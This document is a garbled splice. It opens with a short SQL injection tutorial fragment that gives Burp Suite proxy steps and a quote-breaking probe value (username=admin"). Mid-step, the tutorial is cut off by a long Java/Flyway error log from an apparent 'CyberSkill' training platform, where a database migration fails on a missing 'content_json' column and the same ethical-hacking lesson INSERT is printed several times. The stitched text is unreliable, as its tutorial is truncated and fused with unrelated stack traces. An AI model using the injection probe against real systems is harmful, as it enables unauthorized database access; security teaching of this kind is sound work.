### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin"
  Position: 32
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 01:18:33.633 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Starting CyberSkill Platform...
2026-03-12 01:18:33.637 [vert.x-eventloop-thread-1] INFO  com.cyberskill.config.AppConfig - Application properties loaded successfully
2026-03-12 01:18:33.760 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Running database migrations...
2026-03-12 01:18:33.900 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - Flyway OSS Edition 10.4.1 by Redgate
2026-03-12 01:18:33.900 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - 
2026-03-12 01:18:33.900 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - See release notes here: https://rd.gt/416ObMi
2026-03-12 01:18:34.129 [vert.x-eventloop-thread-1] INFO  org.flywaydb.core.FlywayExecutor - Database: jdbc:postgresql://localhost:5432/cyberskill (PostgreSQL 16.3)
2026-03-12 01:18:34.176 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Schema history table "public"."flyway_schema_history" does not exist yet
2026-03-12 01:18:34.181 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbValidate - Successfully validated 3 migrations (execution time 00:00.026s)
2026-03-12 01:18:34.227 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.JdbcTableSchemaHistory - Creating Schema History table "public"."flyway_schema_history" ...
2026-03-12 01:18:34.460 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Current version of schema "public": << Empty Schema >>
2026-03-12 01:18:34.502 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "1 - Initial Schema"
2026-03-12 01:18:35.081 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "2 - Sample Learning Content"
2026-03-12 01:18:35.106 [vert.x-eventloop-thread-1] ERROR o.f.core.internal.command.DbMigrate - Migration of schema "public" to version "2 - Sample Learning Content" failed! Changes successfully rolled back.
2026-03-12 01:18:35.118 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Database migration failed
org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V2__Sample_Learning_Content.sql failed
------------------------------------------------
SQL State  : 42703
Error Code : 0
Message    : ERROR: column "content_json" of relation "lessons" does not exist
  Position: 157
Location   : db/migration/V2__Sample_Learning_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V2__Sample_Learning_Content.sql)
Line       : 36
Statement  : -- Lesson 1: Introduction to Ethical Hacking (JSONB Content)
INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes, content_json, metadata, content_source)
VALUES (
    1,
    'Introduction to Ethical Hacking',
    'Ethical hacking is the practice of testing computer systems, networks, or applications to find security vulnerabilities that malicious hackers could exploit.',
    'text',
    1,
    15,
    '{
        "title": "Introduction to Ethical Hacking",
        "sections": [
            {
                "heading": "What is Ethical Hacking?",
                "content": "Ethical hacking, also known as penetration testing or white-hat hacking, is the practice of intentionally probing computer systems, networks, and applications to discover security vulnerabilities before malicious actors can exploit them. Ethical hackers use the same tools and techniques as cybercriminals, but with authorization and the goal of improving security."
            },
            {
                "heading": "The Role of Ethical Hackers",
                "content": "Ethical hackers play a crucial role in modern cybersecurity by:",
                "list": [
                    "Identifying security weaknesses before they can be exploited",
                    "Testing the effectiveness of security controls",
                    "Validating compliance with security policies",
                    "Providing actionable recommendations for remediation",
                    "Helping organizations understand their security posture"
                ]
            },
            {
                "heading": "Key Principles",
                "content": "Ethical hacking is guided by several fundamental principles:",
                "subsections": [
                    {
                        "subheading": "Authorization",
                        "content": "Always obtain written permission before testing any system. Unauthorized access is illegal, regardless of intent."
                    },
                    {
                        "subheading": "Scope Definition",
                        "content": "Clearly define what systems, networks, and applications are in scope for testing. Never exceed the agreed-upon boundaries."
                    },
                    {
                        "subheading": "Confidentiality",
                        "content": "Maintain strict confidentiality of all findings and sensitive information discovered during testing."
                    },
                    {
                        "subheading": "Responsible Disclosure",
                        "content": "Report vulnerabilities responsibly to the organization and allow time for remediation before public disclosure."
                    }
                ]
            },
            {
                "heading": "Career Opportunities",
                "content": "The field of ethical hacking offers diverse career paths including penetration tester, security consultant, bug bounty hunter, and security researcher. The demand for skilled ethical hackers continues to grow as organizations recognize the importance of proactive security testing."
            }
        ]
    }'::jsonb,
    '{
        "difficulty": "beginner",
        "estimatedMinutes": 15,
        "prerequisites": [],
        "learningObjectives": [
            "Define ethical hacking and its purpose",
            "Understand the role of ethical hackers in cybersecurity",
            "Recognize key principles guiding ethical hacking",
            "Identify career opportunities in ethical hacking"
        ],
        "tags": ["ethical-hacking", "introduction", "cybersecurity", "career"],
        "author": "CyberSkill Team",
        "lastUpdated": "2026-03-12",
        "version": "1.0"
    }'::jsonb,
    'json'
)

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:244)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V2__Sample_Learning_Content.sql failed
------------------------------------------------
SQL State  : 42703
Error Code : 0
Message    : ERROR: column "content_json" of relation "lessons" does not exist
  Position: 157
Location   : db/migration/V2__Sample_Learning_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V2__Sample_Learning_Content.sql)
Line       : 36
Statement  : -- Lesson 1: Introduction to Ethical Hacking (JSONB Content)
INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes, content_json, metadata, content_source)
VALUES (
    1,
    'Introduction to Ethical Hacking',
    'Ethical hacking is the practice of testing computer systems, networks, or applications to find security vulnerabilities that malicious hackers could exploit.',
    'text',
    1,
    15,
    '{
        "title": "Introduction to Ethical Hacking",
        "sections": [
            {
                "heading": "What is Ethical Hacking?",
                "content": "Ethical hacking, also known as penetration testing or white-hat hacking, is the practice of intentionally probing computer systems, networks, and applications to discover security vulnerabilities before malicious actors can exploit them. Ethical hackers use the same tools and techniques as cybercriminals, but with authorization and the goal of improving security."
            },
            {
                "heading": "The Role of Ethical Hackers",
                "content": "Ethical hackers play a crucial role in modern cybersecurity by:",
                "list": [
                    "Identifying security weaknesses before they can be exploited",
                    "Testing the effectiveness of security controls",
                    "Validating compliance with security policies",
                    "Providing actionable recommendations for remediation",
                    "Helping organizations understand their security posture"
                ]
            },
            {
                "heading": "Key Principles",
                "content": "Ethical hacking is guided by several fundamental principles:",
                "subsections": [
                    {
                        "subheading": "Authorization",
                        "content": "Always obtain written permission before testing any system. Unauthorized access is illegal, regardless of intent."
                    },
                    {
                        "subheading": "Scope Definition",
                        "content": "Clearly define what systems, networks, and applications are in scope for testing. Never exceed the agreed-upon boundaries."
                    },
                    {
                        "subheading": "Confidentiality",
                        "content": "Maintain strict confidentiality of all findings and sensitive information discovered during testing."
                    },
                    {
                        "subheading": "Responsible Disclosure",
                        "content": "Report vulnerabilities responsibly to the organization and allow time for remediation before public disclosure."
                    }
                ]
            },
            {
                "heading": "Career Opportunities",
                "content": "The field of ethical hacking offers diverse career paths including penetration tester, security consultant, bug bounty hunter, and security researcher. The demand for skilled ethical hackers continues to grow as organizations recognize the importance of proactive security testing."
            }
        ]
    }'::jsonb,
    '{
        "difficulty": "beginner",
        "estimatedMinutes": 15,
        "prerequisites": [],
        "learningObjectives": [
            "Define ethical hacking and its purpose",
            "Understand the role of ethical hackers in cybersecurity",
            "Recognize key principles guiding ethical hacking",
            "Identify career opportunities in ethical hacking"
        ],
        "tags": ["ethical-hacking", "introduction", "cybersecurity", "career"],
        "author": "CyberSkill Team",
        "lastUpdated": "2026-03-12",
        "version": "1.0"
    }'::jsonb,
    'json'
)

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: column "content_json" of relation "lessons" does not exist
  Position: 157
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 01:18:35.128 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Error during startup
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:248)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V2__Sample_Learning_Content.sql failed
------------------------------------------------
SQL State  : 42703
Error Code : 0
Message    : ERROR: column "content_json" of relation "lessons" does not exist
  Position: 157
Location   : db/migration/V2__Sample_Learning_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V2__Sample_Learning_Content.sql)
Line       : 36
Statement  : -- Lesson 1: Introduction to Ethical Hacking (JSONB Content)
INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes, content_json, metadata, content_source)
VALUES (
    1,
    'Introduction to Ethical Hacking',
    'Ethical hacking is the practice of testing computer systems, networks, or applications to find security vulnerabilities that malicious hackers could exploit.',
    'text',
    1,
    15,
    '{
        "title": "Introduction to Ethical Hacking",
        "sections": [
            {
                "heading": "What is Ethical Hacking?",
                "content": "Ethical hacking, also known as penetration testing or white-hat hacking, is the practice of intentionally probing computer systems, networks, and applications to discover security vulnerabilities before malicious actors can exploit them. Ethical hackers use the same tools and techniques as cybercriminals, but with authorization and the goal of improving security."
            },
            {
                "heading": "The Role of Ethical Hackers",
                "content": "Ethical hackers play a crucial role in modern cybersecurity by:",
                "list": [
                    "Identifying security weaknesses before they can be exploited",
                    "Testing the effectiveness of security controls",
                    "Validating compliance with security policies",
                    "Providing actionable recommendations for remediation",
                    "Helping organizations understand their security posture"
                ]
            },
            {
                "heading": "Key Principles",
                "content": "Ethical hacking is guided by several fundamental principles:",
                "subsections": [
                    {
                        "subheading": "Authorization",
                        "content": "Always obtain written permission before testing any system. Unauthorized access is illegal, regardless of intent."
                    },
                    {
                        "subheading": "Scope Definition",
                        "content": "Clearly define what systems, networks, and applications are in scope for testing. Never exceed the agreed-upon boundaries."
                    },
                    {
                        "subheading": "Confidentiality",
                        "content": "Maintain strict confidentiality of all findings and sensitive information discovered during testing."
                    },
                    {
                        "subheading": "Responsible Disclosure",
                        "content": "Report vulnerabilities responsibly to the organization and allow time for remediation before public disclosure."
                    }
                ]
            },
            {
                "heading": "Career Opportunities",
                "content": "The field of ethical hacking offers diverse career paths including penetration tester, security consultant, bug bounty hunter, and security researcher. The demand for skilled ethical hackers continues to grow as organizations recognize the importance of proactive security testing."
            }
        ]
    }'::jsonb,
    '{
        "difficulty": "beginner",
        "estimatedMinutes": 15,
        "prerequisites": [],
        "learningObjectives": [
            "Define ethical hacking and its purpose",
            "Understand the role of ethical hackers in cybersecurity",
            "Recognize key principles guiding ethical hacking",
            "Identify career opportunities in ethical hacking"
        ],
        "tags": ["ethical-hacking", "introduction", "cybersecurity", "career"],
        "author": "CyberSkill Team",
        "lastUpdated": "2026-03-12",
        "version": "1.0"
    }'::jsonb,
    'json'
)

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:244)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V2__Sample_Learning_Content.sql failed
------------------------------------------------
SQL State  : 42703
Error Code : 0
Message    : ERROR: column "content_json" of relation "lessons" does not exist
  Position: 157
Location   : db/migration/V2__Sample_Learning_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V2__Sample_Learning_Content.sql)
Line       : 36
Statement  : -- Lesson 1: Introduction to Ethical Hacking (JSONB Content)
INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes, content_json, metadata, content_source)
VALUES (
    1,
    'Introduction to Ethical Hacking',
    'Ethical hacking is the practice of testing computer systems, networks, or applications to find security vulnerabilities that malicious hackers could exploit.',
    'text',
    1,
    15,
    '{
        "title": "Introduction to Ethical Hacking",
        "sections": [
            {
                "heading": "What is Ethical Hacking?",
                "content": "Ethical hacking, also known as penetration testing or white-hat hacking, is the practice of intentionally probing computer systems, networks, and applications to discover security vulnerabilities before malicious actors can exploit them. Ethical hackers use the same tools and techniques as cybercriminals, but with authorization and the goal of improving security."
            },
            {
                "heading": "The Role of Ethical Hackers",
                "content": "Ethical hackers play a crucial role in modern cybersecurity by:",
                "list": [
                    "Identifying security weaknesses before they can be exploited",
                    "Testing the effectiveness of security controls",
                    "Validating compliance with security policies",
                    "Providing actionable recommendations for remediation",
                    "Helping organizations understand their security posture"
                ]
            },
            {
                "heading": "Key Principles",
                "content": "Ethical hacking is guided by several fundamental principles:",
                "subsections": [
                    {
                        "subheading": "Authorization",
                        "content": "Always obtain written permission before testing any system. Unauthorized access is illegal, regardless of intent."
                    },
                    {
                        "subheading": "Scope Definition",
                        "content": "Clearly define what systems, networks, and applications are in scope for testing. Never exceed the agreed-upon boundaries."
                    },
                    {
                        "subheading": "Confidentiality",
                        "content": "Maintain strict confidentiality of all findings and sensitive information discovered during testing."
                    },
                    {
                        "subheading": "Responsible Disclosure",
                        "content": "Report vulnerabilities responsibly to the organization and allow time for remediation before public disclosure."
                    }
                ]
            },
            {
                "heading": "Career Opportunities",
                "content": "The field of ethical hacking offers diverse career paths including penetration tester, security consultant, bug bounty hunter, and security researcher. The demand for skilled ethical hackers continues to grow as organizations recognize the importance of proactive security testing."
            }
        ]
    }'::jsonb,
    '{
        "difficulty": "beginner",
        "estimatedMinutes": 15,
        "prerequisites": [],
        "learningObjectives": [
            "Define ethical hacking and its purpose",
            "Understand the role of ethical hackers in cybersecurity",
            "Recognize key principles guiding ethical hacking",
            "Identify career opportunities in ethical hacking"
        ],
        "tags": ["ethical-hacking", "introduction", "cybersecurity", "career"],
        "author": "CyberSkill Team",
        "lastUpdated": "2026-03-12",
        "version": "1.0"
    }'::jsonb,
    'json'
)

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: column "content_json" of relation "lessons" does not exist
  Position: 157
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 01:18:35.147 [vert.x-eventloop-thread-0] ERROR i.v.c.i.l.c.VertxIsolatedDeployer - Failed in deploying verticle
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:248)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V2__Sample_Learning_Content.sql failed
------------------------------------------------
SQL State  : 42703
Error Code : 0
Message    : ERROR: column "content_json" of relation "lessons" does not exist
  Position: 157
Location   : db/migration/V2__Sample_Learning_Content.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V2__Sample_Learning_Content.sql)
Line       : 36
Statement  : -- Lesson 1: Introduction to Ethical Hacking (JSONB Content)
INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes, content_json, metadata, content_source)
VALUES (
    1,
    'Introduction to Ethical Hacking',
    'Ethical hacking is the practice of testing computer systems, networks, or applications to find security vulnerabilities that malicious hackers could exploit.',
    'text',
    1,
    15,
    '{
        "title": "Introduction to Ethical Hacking",
        "sections": [
            {
                "heading": "What is Ethical Hacking?",
                "content": "Ethical hacking, also known as penetration testing or white-hat hacking, is the practice of intentionally probing computer systems, networks, and applications to discover security vulnerabilities before malicious actors can exploit them. Ethical hackers use the same tools and techniques as cybercriminals, but with authorization and the goal of improving security."
            },
            {
                "heading": "The Role of Ethical Hackers",
                "content": "Ethical hackers play a crucial role in modern cybersecurity by:",
                "list": [
                    "Identifying security weaknesses before they can be exploited",
                    "Testing the effectiveness of security controls",
                    "Validating compliance with security policies",
                    "Providing actionable recommendations for remediation",
                    "Helping organizations understand their security posture"
                ]
            },
            {
                "heading": "Key Principles",
                "content": "Ethical hacking is guided by several fundamental principles:",
                "subsections": [
                    {
                        "subheading": "Authorization",
                        "content": "Always obtain written permission before testing any system. Unauthorized access is illegal, regardless of intent."
                    },
                    {
                        "subheading": "Scope Definition",
                        "content": "Clearly define what systems, networks, and applications are in scope for testing. Never exceed the agreed-upon boundaries."
                    },
                    {
                        "subheading": "Confidentiality",
                        "content": "Maintain strict confidentiality of all findings and sensitive information discovered during testing."
                    },
                    {
                        "subheading": "Responsible Disclosure",
                        "content": "Report vulnerabilities responsibly to the organization and allow time for remediation before public disclosure."
                    }
                ]
            },
            {
                "heading": "Career Opportunities",
                "content": "The field of ethical hacking offers diverse career paths including penetration tester, security consultant, bug bounty hunter, and security researcher. The demand for skilled ethical hackers continues to grow as organizations recognize the importance of proactive security testing."
            }
        ]
    }'::jsonb,
    '{
        "difficulty": "beginner",
        "estimatedMinutes": 15,
        "prerequisites": [],
        "learningObjectives": [
            "Define ethical hacking and its purpose",
            "Understand the role of ethical hackers in cybersecurity",
            "Recognize key principles guiding ethical hacking",
            "Identify career opportunities in ethical hacking"
        ],
        "tags": ["ethical-hacking", "introduction", "cybersecurity", "career"],
        "author": "CyberSkill Team",
        "lastUpdated": "2026-03-12",
        "version": "1.0"
    }'::jsonb,
    'json'
)

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
